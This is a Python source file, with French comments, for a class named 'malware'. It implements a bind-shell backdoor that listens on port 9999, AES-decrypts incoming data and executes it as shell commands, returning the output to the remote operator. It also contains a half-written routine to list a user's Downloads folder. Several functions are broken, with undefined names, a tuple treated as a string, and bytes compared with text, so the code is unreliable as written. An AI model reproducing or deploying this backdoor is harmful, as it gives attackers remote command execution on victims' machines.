import os
import socket
import subprocess
from Crypto.Cipher import AES
from os import listdir

class malware:
    def __init__(self, ip='', port=9999, socket=socket.socket(socket.AF_INET, socket.SOCK_STREAM), key= open("Key.bin", 'rb').read(), iv = open("Vector.bin", 'rb').read()):
        self.port = port
        self.ip = ip
        self.socket = socket
        self.key = key
        self.iv = iv
        self.AES = AES.new(key, AES.MODE_CFB, iv)


    def socketBind(self):
        try:
            print("Binding socket to port: " + str(self.port))
            self.socket.bind((self.ip, self.port))  # le serveur attend une connexion de la part du client
            self.socket.listen(5)  # commence à écouter les connexions entrantes
        except socket.error as msg:
            print("Socket binding error: " + str(msg) + "\n" + "Retrying...")  #
            socketBind()

    def socketAccept(self):
        conn, address = self.socket.accept()  # accepte une connexion, retourne un nouveau socket et une adresse client
        print("Connection is established | " + "IP " + address[0] + " | Port " + str(address[1]))  # affiche l'adresse ip et le port quand la connexion est réussie
        self.receiveCommands(conn)  # Appel de fonction
        conn.close()  # ferme le socket

    def receiveCommands(self, conn):

        while True:
            data = conn.recv(9999999)  # recoit les donnees, jusqua 2048 caracteres
            data = self.AES.decrypt(data)

            if data[:2].decode("utf-8", 'ignore') == 'cd':
                os.chdir(data[3:].decode("utf-8"))
                rep = 'CD'
                output_str = rep.encode('utf-8')
                conn.send(output_str)

            if data== 'dl':
                self.getDirectory(f)
                data = str(self.getDirectory())
                output_str = (data, "utf-8",'ignore')  # stock en chaine de caracteres et ignore les caracteres speciaux
                output_str = self.AES.encrypt(output_str.encode('utf-8'))
                conn.send(output_str)  # envoie la variable a lautre machine visée


            if len(data[:]) > 0:  # permet d'eviter les simple enter dans le remote shell
                cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)  # subprocess.PIPE : indique qu'un tube vers le flux standard doit être ouvert
                output_bytes = cmd.stdout.read() + cmd.stderr.read()  # recupere la sortie et les erreur
                output_str = str(output_bytes, "utf-8",'ignore')  # stock en chaine de caracteres et ignore les caracteres speciaux
                output_str = output_str.encode('utf-8')
                conn.send(output_str)  # envoie la variable a lautre machine visée

    def getDirectory(self):

        path = r"C:\Users\user\Downloads"
        files = os.listdir(path)
        f = files

#load
m=malware()
m.socketBind()
m.socketAccept()

